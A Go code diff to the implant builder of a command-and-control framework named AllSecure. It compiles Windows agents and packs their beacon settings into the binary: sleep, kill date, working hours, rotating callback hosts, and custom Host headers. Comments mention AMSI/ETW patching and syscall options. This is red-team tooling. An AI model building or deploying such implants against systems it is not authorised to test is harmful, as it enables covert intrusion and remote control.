@@ -1,16 +1,21 @@
 package Builder
 
 import (
-	LSCommon "AllSecure/ListeningServer/Common"
 	TSCommon "AllSecure/TeamServer/Common"
 	"AllSecure/TeamServer/Common/Packer"
+	"AllSecure/TeamServer/Common/Utility"
 	"AllSecure/TeamServer/Common/win32"
+	"AllSecure/TeamServer/Crypt"
 	"bytes"
 	"errors"
+	"fmt"
 	"log"
 	"os"
 	"os/exec"
+	"path"
+	"path/filepath"
 	"strconv"
+	"strings"
 )
 
 const (
@@ -221,14 +226,105 @@ func (ab *AgentBuilder) Build() bool {
 		log.Println("[error] attempting to create patch config: ", err)
 		return false
 	}
+	log.Println("[info] Len Config Bytes: ", len(Config))
+	ConfigByteString := "{"
+	for i := range Config {
+		if i == (len(Config) - 1) {
+			ConfigByteString += fmt.Sprintf("0x%02x", Config[i])
+		} else {
+			ConfigByteString += fmt.Sprintf("0x%02x\\,", Config[i])
+		}
+	}
+	ConfigByteString += "}"
+	ab.compilerOptions.Defines = append(ab.compilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
+	log.Println("[info] Config Bytes: ", ConfigByteString)
 
+	if ab.config.Arch == ARCHITECTURE_X64 {
+		abs, err := filepath.Abs(ab.compilerOptions.Config.Compiler64)
+		if err != nil {
+			log.Println("[error] attempting to get absolute path for compiler: ", err)
+			return false
+		}
+		ab.compilerOptions.Config.Compiler64 = abs
+		CompilerCommand += "\"" + ab.compilerOptions.Config.Compiler64 + "\" "
+	} else {
+		abs, err := filepath.Abs(ab.compilerOptions.Config.Compiler86)
+		if err != nil {
+			log.Println("[error] attempting to get absolute path for compiler: ", err)
+			return false
+		}
+		ab.compilerOptions.Config.Compiler86 = abs
+		CompilerCommand += "\"" + ab.compilerOptions.Config.Compiler86 + "\" "
+	}
+
+	//add sources
+	for _, dir := range ab.compilerOptions.SourceDirs {
+		files, err := os.ReadDir(ab.sourcePath + "/" + dir)
+		if err != nil {
+			log.Println("[error] attempting to read source directory: ", err)
+			return false
+		}
+		for _, f := range files {
+			var FilePath = dir + "/" + f.Name()
+
+			// only add the assembly if the agent is x64
+			if path.Ext(f.Name()) == ".asm" {
+				if (strings.Contains(f.Name(), ".x64.") && ab.config.Arch == ARCHITECTURE_X64) ||
+					(strings.Contains(f.Name(), ".x86.") && ab.config.Arch == ARCHITECTURE_X86) {
+					rand_name, _ := Crypt.GenerateRandomString(10)
+					AsmObj := ab.CompileDir + rand_name + ".o"
+					var AsmCompileStr string
+					if ab.config.Arch == ARCHITECTURE_X64 {
+						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj)
+					} else {
+						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj)
+					}
+					ab.FilesCreated = append(ab.FilesCreated, AsmObj)
+					ab.CompileCmd(AsmCompileStr)
+					CompilerCommand += AsmObj + " "
+				}
+			} else if path.Ext(f.Name()) == ".c" {
+				CompilerCommand += FilePath + " "
+			}
+		}
+	}
+	// add all include files under include directories
+	for _, dir := range ab.compilerOptions.IncludeDirs {
+		CompilerCommand += "-I" + dir + " "
+	}
+
+	// add all compiler flags
+	CompilerCommand += strings.Join(ab.compilerOptions.CFlags, " ")
+
+	// add all definitions. Will compile with -D flag
+	// adds preprocessor declarations to the code so that certain code sections will run when
+	// the defines are set.
+	ab.compilerOptions.Defines = append(ab.compilerOptions.Defines, ab.GetListenerDefinitons()...)
+	for _, define := range ab.compilerOptions.Defines {
+		CompilerCommand += "-D" + define + " "
+	}
+
+	switch ab.FileType { // will only by exe for now
+	case FILETYPE_WINDOWS_EXE:
+		if ab.config.Arch == ARCHITECTURE_X64 {
+			CompilerCommand += "-D MAIN_THREADED -e main"
+		} else {
+			CompilerCommand += "-D MAIN_THREADED -e _main"
+		}
+		CompilerCommand += ab.compilerOptions.Main.Exe + " "
+		break
+	}
+	CompilerCommand += "-o" + ab.outputPath
+
+	Success := ab.CompileCmd(CompilerCommand)
+	return Success
 }
 
 func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 	var (
-		AgentConfig  = Packer.Packer{}
-		Sleep        int
-		Jitter       int
+		AgentConfig = Packer.Packer{}
+		Sleep       int
+		Jitter      int
 		//Alloc        int
 		//Execute      int
 		//Spawn64      string
@@ -239,7 +335,7 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 		//StackSpoof   = win32.FALSE
 		//Syscall      = win32.FALSE
 		//AmsiPatch    = AMSIETW_PATCH_NONE
-		err          error
+		err error
 	)
 
 	if val, ok := ab.config.Config["Sleep"].(string); ok {
@@ -271,13 +367,73 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 	case TSCommon.HTTP_SERVER:
 		var (
 			Config = ab.config.ListenerConfig.(*TSCommon.HTTPServerConfig)
-			Port, err = strconv.Atoi(Config.Port)
+			err    error
 		)
-		if Port == 0 || err != nil {
-			return nil, errors.New("invalid port")
-		}
 		AgentConfig.AddInt64(Config.KillDate)
-		WorkingHours, err := 
+		WorkingHours, err := Utility.ParseWorkingHours(Config.WorkingHours)
+		if err != nil {
+			log.Println("[error] failed to parse working hours: ", err)
+		}
+
+		AgentConfig.AddInt32(WorkingHours)
+
+		if strings.ToLower(Config.Method) == "get" {
+			return nil, errors.New("[error] Get method is not supported")
+		} else {
+			AgentConfig.AddWString("POST")
+		}
+
+		switch Config.HostRotation {
+		case "round-robin":
+			AgentConfig.AddInt(0)
+			break
+		case "random":
+			AgentConfig.AddInt(1)
+			break
+		default:
+			AgentConfig.AddInt(1)
+			break
+		}
+
+		AgentConfig.AddInt(len(Config.Hosts)) // add number of potential hosts to config buffer.
+		for _, host := range Config.Hosts {
+			var HostAndPort []string
+
+			HostAndPort = strings.Split(host, ":")
+			addr := HostAndPort[0]
+			port, err := strconv.Atoi(HostAndPort[1])
+			if err != nil {
+				return nil, errors.New("[error] attempting to convert port to int: " + err.Error())
+			}
+			AgentConfig.AddWString(addr)
+			AgentConfig.AddInt(port)
+		}
+
+		if Config.Secure {
+			AgentConfig.AddInt(win32.TRUE)
+		} else {
+			AgentConfig.AddInt(win32.FALSE)
+		}
+
+		AgentConfig.AddWString(Config.UserAgent)
+		if len(Config.Headers) == 0 { // if headers is zero
+			if Config.HostHeader != "" { // if host header is not set
+				AgentConfig.AddInt(2)                                // number of headers
+				AgentConfig.AddWString("Content-Type: */*")          // content type header
+				AgentConfig.AddWString("Host: " + Config.HostHeader) //host header
+			} else { // if host header is set
+				AgentConfig.AddInt(1)                       //number of headers
+				AgentConfig.AddWString("Content-Type: */*") // add content-type header
+			}
+		} else { // if headers is not zero
+			if Config.HostHeader != "" {
+				Config.Headers = append(Config.Headers, "Host: "+Config.HostHeader)
+			}
+			AgentConfig.AddInt(len(Config.Headers)) // add number of headers to config buffer
+			for _, header := range Config.Headers {
+				AgentConfig.AddWString(header) // add header to config buffer
+			}
+		}
 	}
 
 	return AgentConfig.GetBuffer(), nil
@@ -305,4 +461,18 @@ func (ab *AgentBuilder) CompileCmd(cmd string) bool {
 		return false
 	}
 	return true
+}
+
+func (ab *AgentBuilder) GetListenerDefinitons() []string {
+	var def []string
+
+	switch ab.config.ListenerType {
+	case TSCommon.HTTP_SERVER:
+		def = append(def, "TRANSPORT_HTTP")
+		break
+	case TSCommon.SMB_SERVER:
+		def = append(def, "TRANSPORT_SMB")
+		break
+	}
+	return def
 }
